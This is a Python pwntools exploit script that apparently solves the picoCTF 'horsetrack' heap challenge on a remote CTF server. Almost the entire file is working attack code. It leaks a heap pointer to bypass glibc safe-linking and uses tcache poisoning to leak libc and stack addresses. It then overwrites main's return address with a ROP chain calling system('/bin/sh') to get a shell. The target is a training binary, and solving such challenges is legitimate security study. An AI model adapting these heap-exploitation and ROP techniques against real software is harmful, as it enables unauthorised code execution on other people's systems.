import struct
from pwn import *

#####################################################change directory#################################3
level = "horsetrack"
ip = "saturn.picoctf.net:59075"
dir = "/home/ayush/Work/picoCTF/BinaryExploitation/"+level

########################################operation mode#########################################
args.DEBUG = False
args.REMOTE = True
#####################################setup solution################################################
context.arch = 'amd64'
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
binary = ELF(dir + "/vuln")
libc = ELF(dir + "/libc.so.6")
#######################################start process#############################################
def conn():
    if args.REMOTE:
        return remote(ip.split(':')[0], ip.split(':')[1])
    elif args.DEBUG:
        return gdb.debug(binary.path, gdbscript="break *0x400947\nc\nx/24wx 0x601058\n")
    else:
        return process([binary.path])
r = conn()
################################calling functions of the binary################################
def cheat(index, name, newspot):
    global r
    r.sendlineafter(":", b'0')
    r.sendlineafter("?", str(index).encode())
    r.sendlineafter(":", name)
    r.sendlineafter("?", newspot)

def add_horse(index, length, name):
    global r
    r.sendlineafter(":", b'1')
    r.sendlineafter("?", str(index).encode())
    r.sendlineafter("?", str(length).encode())
    r.sendlineafter(":", name)

def remove_horse(index):
    global r
    r.sendlineafter(":", b'2')
    r.sendlineafter("?", str(index).encode())

def race():
    global r
    r.sendline(b'3')
###############################leaking aslr bits for countering safe linking############################################3
for i in range(8):
    add_horse(i, 256, b'b'*256)
    remove_horse(i)
    add_horse(i, 256, b'\xFF')
race()
r.recvuntil(b"WINNER: ")
address = int.from_bytes(r.recvline().replace(b'\n', b''), 'little')
log.info("alsr address leak(front pointer of tcache): " + hex(address))

############################################leaking the address of libc#################################################
remove_horse(0)
remove_horse(1)
# to make sure the stable 0 and 1 are in the tcache
add_horse(0, 256, b'\x00' * 256)
add_horse(1, 256, b'\x00' * 256)

remove_horse(1)
remove_horse(0)
#heap address where the libc address is stored
address_for_stable1 = 0x4040E0

cheat(0, struct.pack("l", address_for_stable1 ^ address) + b'\xFF', b'0')

add_horse(0, 256, b'\x00' * 256)
#the malloc in the add_horse for the stable 1 will be on the 0x4040E0 address
add_horse(1, 256, b'\xFF')

libc_leak = address
while libc_leak == address or libc_leak == 0:
    race()
    r.recvuntil(b'WINNER: ')
    libc_leak = int.from_bytes(r.recvuntil(b'\n').replace(b'\n', b''), 'little')

#the 0x1BE5E0 is the address offset of stderr to the libc base. to find this we can gdb into the running version of the program or the libc provided in the ctf and get the symbols address(like gets/puts/atoi) and get the version from the libc.rip
libc_base = libc_leak - 0x1BE5E0
log.info("Libc base: " + hex(libc_base))

########################################finding the stack pointer/return pointer to write to############################

remove_horse(3)
remove_horse(2)
#libc address where stack address is stored
address_for_stable1 = libc_base + 0x1bf620

cheat(2, struct.pack("l", address_for_stable1 ^ address) + b'\xFF', b'2')

add_horse(2, 256, b'\x00' * 256)
#the malloc in the add_horse for the stable 1 will be on the address_for_stable1 address
add_horse(3, 256, b'\xFF')

remove_horse(5)
remove_horse(4)
#heap address where the libc address is stored
address_for_stable3 = 0x4040E0

cheat(4, struct.pack("l", address_for_stable3 ^ address) + b'\xFF', b'4')

add_horse(4, 256, b'\x00' * 256)
#the malloc in the add_horse for the stable 3 will be on the 0x4040E0 address
add_horse(5, 256, b'\xFF')

stack_leak = address
while stack_leak == address or stack_leak == 0 or stack_leak == libc_leak:
    race()
    r.recvuntil(b'WINNER: ')
    stack_leak = int.from_bytes(r.recvuntil(b'\n').replace(b'\n', b''), 'little')
#the 0xf8 is the address offset of heap stack address to the main return address. to find this we can gdb into the running version of the program 
main_ret = stack_leak - 0xf8
log.info("Return address of the main: " + hex(main_ret))
#######################################setup ROP######################################################
libc.address = libc_base
rop_libc = ROP(libc)
rop_libc.call((rop_libc.find_gadget(["ret"]))[0])
rop_libc.call(libc.symbols['system'], [next(libc.search(b"/bin/sh"))])

payload = rop_libc.chain() + b'\xFF'

remove_horse(7)
remove_horse(6)

cheat(6, struct.pack("L", main_ret ^ address) + b'\xFF', b'6')

add_horse(6, 256, b'\xFF')
add_horse(7, 256, payload)
#############################################Get Shell##################################################################
# r.sendlineafter(":", b'4')
r.interactive()